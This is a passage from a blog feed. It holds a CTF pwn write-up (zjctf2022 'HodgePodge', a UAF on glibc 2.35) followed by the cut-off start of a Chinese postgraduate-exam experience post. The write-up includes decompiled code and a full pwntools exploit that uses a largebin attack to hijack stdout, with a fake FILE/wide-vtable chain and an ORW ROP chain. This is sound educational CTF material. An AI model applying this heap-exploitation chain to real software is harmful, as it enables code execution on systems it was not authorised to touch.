title="UAF2"></a>UAF2</h3><p>ä¾‹é¢˜ä¿¡æ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æ¥æºï¼šzjctf2022å†³èµ›-HodgePodge</span><br><span class="line">libcç‰ˆæœ¬ï¼šubuntu2.35-0-3</span><br><span class="line">æ¼æ´ï¼šUAF</span><br><span class="line">é™åˆ¶ï¼š0x400 &lt; å †å—å¤§å° &lt;= 0x430</span><br><span class="line">     å †å—çš„id &lt;= 9</span><br><span class="line">     å¼€äº†æ²™ç®±ï¼Œorwè¯»å–flag</span><br></pre></td></tr></table></figure><p>ADDï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.del&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.edit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.show&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;&gt;&gt;&quot;</span>, <span class="number">2uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DELETEï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_144C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">  v0 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid idx&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( chunk_list[v0] )</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EDITï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_13B6</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">  v1 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid idx&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = chunk_list[v1];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, chunk_list[v1], size_list[v1]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SHOWï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_14B9</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;idx&quot;</span>);</span><br><span class="line">  v1 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid idx&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = chunk_list[v1];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(chunk_list[v1]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. ç”³è¯·ä¸€ç³»åˆ—çš„largebinå¤§å°çš„å †ï¼Œé‡Šæ”¾ä¸€ä¸ªè¿›å…¥unsorted binï¼Œæ³„éœ²å‡ºlibc_baseï¼Œç”³è¯·ä¸€ä¸ªæ¯”unsorted binä¸­å †å—å¤§çš„chunkï¼Œåˆ™unsorted binä¸­çš„free_chunkè¿›å…¥large binï¼Œæ³„éœ²å‡ºheap_base</span><br><span class="line">2. ä¿®æ”¹largebinä¸­çš„å †å—ï¼Œä½¿å…¶bk_nextsizeæŒ‡å‘stdout-0x20</span><br><span class="line">3. é‡Šæ”¾idxä¸º1çš„å †å—è¿›å…¥unsorted binï¼Œåˆ©ç”¨idxä¸º0çš„å †å—æ„é€ idxä¸º1å †å—çš„prev_sizeä¸º0x8000</span><br><span class="line">4. ç”³è¯·ä¸€ä¸ªæ¯”unsorted binå¤§çš„chunkï¼Œé€ æˆlargebin attackï¼ŒåŠ«æŒstdout</span><br><span class="line">5. åˆ©ç”¨putsè§¦å‘é“¾å­ï¼Œè¾¾åˆ°orw</span><br><span class="line"></span><br><span class="line"> â–º f 0   0x7f5d6e683c14 _IO_wdoallocbuf+36</span><br><span class="line">   f 1   0x7f5d6e686675 _IO_wfile_overflow+613</span><br><span class="line">   f 2   0x7f5d6e680f9c puts+204</span><br></pre></td></tr></table></figure><h4 id="è°ƒè¯•ä¿¡æ¯-1"><a href="#è°ƒè¯•ä¿¡æ¯-1" class="headerlink" title="è°ƒè¯•ä¿¡æ¯"></a>è°ƒè¯•ä¿¡æ¯</h4><p>åŠ«æŒ<code>stdout</code>ä¸ºç›®æ ‡å †ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309012032769.png" alt="image-20230901203218606"></p><p>ç›®æ ‡å †å³<code>fake_IO_2_1_stdout_</code>ç»“æ„ä½“å¦‚ä¸‹ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309012037074.png" alt="image-20230901203730853"></p><p>ä¼ªé€ çš„<code>_wide_data</code>ç»“æ„ä½“å¦‚ä¸‹ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309012041239.png" alt="image-20230901204104152"></p><p>ä¼ªé€ çš„<code>_wide_vtable</code>ç»“æ„ä½“å¦‚ä¸‹ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309012043352.png" alt="image-20230901204349224"></p><p>æœ€åé€šè¿‡<code>puts</code>è§¦å‘å¦‚ä¸‹é“¾å­ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309012047350.png" alt="image-20230901204737269"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â–º f 0   0x7f840de83c14 _IO_wdoallocbuf+36</span><br><span class="line">  f 1   0x7f840de86675 _IO_wfile_overflow+613</span><br><span class="line">  f 2   0x7f840de80f9c puts+204</span><br><span class="line">  f 3   0x560d95ab0344</span><br><span class="line">  f 4   0x560d95ab076a</span><br><span class="line">  f 5   0x7f840de29d90 __libc_start_call_main+128</span><br><span class="line">  f 6   0x7f840de29e40 __libc_start_main+128</span><br><span class="line">  f 7   0x560d95ab01ae</span><br></pre></td></tr></table></figure><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the content\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Content\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;idx\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x410</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x410</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x420</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x420</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">8</span>)  <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x7f3936a19ce0</span> - <span class="number">0x7f3936800000</span></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - offset</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>)    <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + <span class="string">b&#x27;anza&#x27;</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;anza&#x27;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xef0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base===&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">l_main = libc_base + <span class="number">0x219cd0</span></span><br><span class="line">stdout = libc_base + libc.sym[<span class="string">&quot;stdout&quot;</span>]</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029cd6</span></span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">edit(<span class="number">3</span>, p64(l_main)*<span class="number">2</span> + p64(heap_base+<span class="number">0xef0</span>) + p64(stdout - <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">fake_IO_stdout_addr = heap_base + <span class="number">0x6b0</span></span><br><span class="line">fake_IO_stdout = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">fake_IO_stdout = fake_IO_stdout.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_IO_stdout_addr + <span class="number">0xe0</span>)</span><br><span class="line">fake_IO_stdout = fake_IO_stdout.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_stdout = fake_IO_stdout.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(_IO_wfile_jumps - <span class="number">0x20</span>)</span><br><span class="line">fake_IO_stdout = fake_IO_stdout.ljust(<span class="number">0x170</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_base + <span class="number">0x2b0</span>) + p64(ret)</span><br><span class="line">fake_IO_stdout = fake_IO_stdout.ljust(<span class="number">0xd0</span> + <span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_IO_stdout_addr + <span class="number">0xe0</span> + <span class="number">0xf0</span>)</span><br><span class="line">fake_IO_stdout = fake_IO_stdout.ljust(<span class="number">0xe0</span> + <span class="number">0xf0</span> + <span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(setcontext + <span class="number">61</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, fake_IO_stdout)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># add(0x430, b&#x27;g&#x27;*8)</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x410</span>*<span class="string">b&quot;a&quot;</span> + p64(<span class="number">0x8000</span>))</span><br><span class="line"></span><br><span class="line">orw_addr = heap_base + <span class="number">0x2b0</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x1760</span></span><br><span class="line">orw = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(open_addr)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_r12_ret) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_r12_ret) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(write_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, orw)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;./flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">0x430</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;è®°å½•ä¸€äº›å †é¢˜çš„ç»ƒä¹ ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>åŒéä¸€æˆ˜ä¸Šå²¸æ­¦æ±‰å¤§å­¦ç½‘å®‰ä¸“ç¡•</title>
    <link href="http://example.com/2023/04/03/hznu2whu/"/>
    <id>http://example.com/2023/04/03/hznu2whu/</id>
    <published>2023-04-03T06:35:48.000Z</published>
    <updated>2023-04-07T07:12:33.976Z</updated>
    
    <content type="html"><![CDATA[<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304042018896.png" alt="image-20230404201805060" style="zoom: 25%;" /><span id="more"></span><h2 id="ä¸ªäººæƒ…å†µ"><a href="#ä¸ªäººæƒ…å†µ" class="headerlink" title="ä¸ªäººæƒ…å†µ"></a>ä¸ªäººæƒ…å†µ</h2><p>æœ¬äººå°±è¯»äºæ­å·æŸæ‰€åŒéé™¢æ ¡ï¼Œæœ¬ç§‘ä¸“ä¸šä¸ºè®¡ç®—æœºï¼ˆé‡‘èæ–¹å‘ï¼‰ï¼Œåˆè¯•æˆç»© 392ï¼ˆ69+84+129+110ï¼‰ã€‚</p><p>æŠ¥è€ƒæ­¦å¤§ç½‘å®‰ä¸€æ–¹é¢æ˜¯å› ä¸ºè‡ªå·±å¯¹æœ¬ç§‘ä¸“ä¸šæ–¹å‘ä¸æ˜¯å¾ˆæ„Ÿå…´è¶£ï¼Œå¦ä¸€æ–¹é¢ä½œä¸ºä¸€å CTFer å°é€æ˜ï¼Œåœ¨æˆ‘é™¢çš„ç½‘å®‰å®éªŒå®¤é‡Œåšå‡ºäº†ç‚¹æˆç»©ï¼Œæƒ³å»æ›´é«˜çš„å¹³å°çœ‹çœ‹å¤§ä½¬ã€‚</p><p>æ‹©æ ¡è¿‡ç¨‹ï¼šæš¨å—å¤§å­¦ç½‘å®‰ä¸“ =&gt; å¦é—¨å¤§å­¦è®¡ä¸“ =&gt; æ­¦æ±‰å¤§å­¦ç½‘å®‰ä¸“ã€‚</p><p>é€‰æ‹©æš¨å¤§æ˜¯å› ä¸ºå®ƒä»¬ç½‘å®‰å‘å±•ä¼¼ä¹æŒºä¸é”™çš„ï¼ŒCTF æˆ˜é˜Ÿä¹Ÿå¾ˆç‰›ï¼Œè€Œä¸”åªè€ƒä¸€é—¨æ•°æ®ç»“æ„ï¼ŒåæœŸ F*cking 408 å­¦ä¸ä¸‹å»äº†å°±ç›´æ¥è½¬ï¼›ç„¶åæƒ³å†²å¦å¤§ä¸€æ–¹é¢æ˜¯å› ä¸º 408 ç®—æ˜¯å­¦ä¸‹å»äº†ï¼Œå¦ä¸€æ–¹é¢æœ‰ä¸ªåšäºŒè¿›åˆ¶å®‰å…¨å¾ˆç‰›çš„è€å¸ˆåœ¨è®¡é™¢ï¼ˆä¹Ÿå›¾å¦å¤§çš„ç¾ä¸½ï¼Œä½†éæœ¬éƒ¨æ ¡åŒºï¼‰ï¼›å†åæ¥ï¼Œå¦å¤§æ‹›ç”Ÿåå•ä¸€å‡ºï¼Œäººæ•°ç åŠï¼Œè€Œæ­¦å¤§ç½‘å®‰é‚£è¾¹ä¼ æ¥æ¶ˆæ¯è¯´ä¿ç ”é€‰æ‰‹é¸½äº†å¥½å¤šï¼Œåé¢éƒ½è…¾å‡ºæ¥ç»™ç»Ÿæ‹›äº†ï¼Œé‚å†²ï¼ˆæ­¦å¤§ä¹Ÿç¾ï¼Œä½†ä¹Ÿéæœ¬éƒ¨æ ¡åŒºğŸ˜­ï¼‰ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304042052686.jpg" alt="img" style="zoom: 25%;" /><h2 id="åˆè¯•è§„åˆ’"><a href="#åˆè¯•è§„åˆ’" class="headerlink" title="åˆè¯•è§„åˆ’"></a>åˆè¯•è§„åˆ’</h2><p>æ­¦å¤§ç½‘å®‰ä¸“ç¡•çš„è€ƒè¯•ç§‘ç›®ä¸ºï¼šæ”¿æ²»ï¼Œè‹±è¯­äºŒï¼Œæ•°å­¦äºŒï¼Œ408è®¡ç®—æœºä¸“ä¸šåŸºç¡€ã€‚</p><p>é‰´äºæ•°å­¦ã€ä¸“ä¸šè¯¾åŸºç¡€æ¯”è¾ƒè–„å¼±ï¼Œæœ¬äººä» 2022 å¹´ä¸€æœˆå°±å¼€å§‹å‡†å¤‡ï¼Œå®é™…ä¸Šä¸‰æœˆå¼€å§‹å‡†å¤‡ä¹Ÿå®Œå…¨èµ¶å¾—ä¸Šã€‚</p><h3 id="æ”¿æ²»"><a href="#æ”¿æ²»" class="headerlink" title="æ”¿æ²»"></a>æ”¿æ²»</h3><p>æ”¿æ²»æ— éœ€å¤ªæ—©å‡†å¤‡ï¼Œå¤§éƒ¨åˆ†è€ƒç‚¹ï¼ˆå°¤å…¶æ¯›ä¸­ç‰¹å’Œå²çº²ï¼‰éƒ½ç»“åˆäº†<strong>æ—¶äº‹</strong>ï¼ŒåæœŸä¼šæœ‰å¾ˆå¤šåå¸ˆå¸®ä½ æ•´ç†ã€‚</p><p>æˆ‘æ˜¯ 9 æœˆå¼€å§‹å‡†å¤‡æ”¿æ²»çš„ï¼Œç”¨çš„å‚è€ƒä¹¦ä¸ºã€Šè‚–ç§€è£â€”â€”çŸ¥è¯†ç‚¹ç²¾è®²ç²¾ç»ƒã€‹å’Œã€Š1000é¢˜ã€‹ï¼Œå¬çš„æ˜¯è…¿å§çš„åŸºç¡€ç­ï¼Œå¬ä¸€ç« åšä¸€ç« ã€Š1000ã€‹é¢˜ï¼ˆåˆ†æé¢˜ä¸åšï¼‰ï¼Œç„¶åè·Ÿçš„ä¹Ÿæ˜¯è…¿å§çš„å¼ºåŒ–ç­å’ŒæŠ€å·§ç­ï¼Œè…¿å§æœ‰å¯¹<strong>å…³é”®è¯</strong>åšæ•´ç†ï¼Œå¯¹æˆ‘å˜æ¸…çŸ¥è¯†æ¡†æ¶æŒºæœ‰å¸®åŠ©çš„ï¼ŒæŠ€å·§ç­å°±è§ä»è§æ™ºå§ï¼Œä¼¼ä¹ä»Šå¹´æœ‰å¾ˆå¤šäººæ ½åœ¨è¿™ä¸Šé¢äº†ï¼Œä½†æˆ‘ä¸ªäººè§‰å¾—è¿˜è¡Œã€‚åæ­£å°±åœ¨é‚£å‡ ä¸ªè€ƒç ”é£è¯„ä¸é”™çš„æ”¿æ²»è€å¸ˆé‡Œè·Ÿç´§ä¸€ä¸ªå°±å¯¹äº†ï¼Œæ”¿æ²»åˆ†æ•°å·®åˆ«ä¸å¤§ã€‚</p><p>åæœŸæŠ¼é¢˜å·æˆ‘åªå‚è€ƒäº†<strong>è‚–å››è‚–å…«</strong>ï¼Œè‚–å…«è€ƒå‰ä¸€ä¸ªæœˆä¼šæœ‰ï¼Œè‚–å››è€ƒå‰ä¸¤å‘¨ä¼šæœ‰ï¼Œä¸ªäººè®¤ä¸ºèƒŒè¯µçš„ä¼˜å…ˆçº§ï¼šè‚–å››å…¨å· &gt; è‚–å…«çš„é€‰æ‹©é¢˜ &gt; è‚–å…«çš„åˆ†æé¢˜ã€‚æŠ¼é¢˜å·ä¸ä¸€å®šèƒ½å›Šæ‹¬æ‰€æœ‰é¢˜ç›®ï¼Œä¸»è¦å°±æ˜¯å·©å›ºçŸ¥è¯†ç‚¹å’Œå­¦ä¹ è¯æœ¯ç”¨çš„ï¼Œå¤šèƒŒæ€»æ²¡é”™ï¼Œæœ€åå‡ å¤©è‡ªå·±æœ€å¥½èƒ½æ€»ç»“ä¸€å¥—åˆ†æé¢˜çš„å†™æ³•ã€‚é—²ç€çš„æ—¶å€™å¯ä»¥åœ¨å°ç¨‹åºä¸Šåˆ·åˆ·ä¹ é¢˜å†Œæˆ–è€…æŠ¼é¢˜å·ã€‚</p><p>ç”±äºæœ¬äººæ²¡æœ‰å¤æ ¸ï¼Œå‚è€ƒç½‘ä¸Šè¿˜ç®—æƒå¨çš„ç­”æ¡ˆï¼Œä¼°æ‘¸ç€å®¢è§‚38 + ä¸»è§‚31ã€‚</p><h3 id="è‹±è¯­"><a href="#è‹±è¯­" class="headerlink" title="è‹±è¯­"></a>è‹±è¯­</h3><p>æœ¬äººè‹±è¯­åŸºç¡€è¿˜è¡Œï¼Œå››å…­çº§ 550+ï¼Œåœ¨è€ƒç 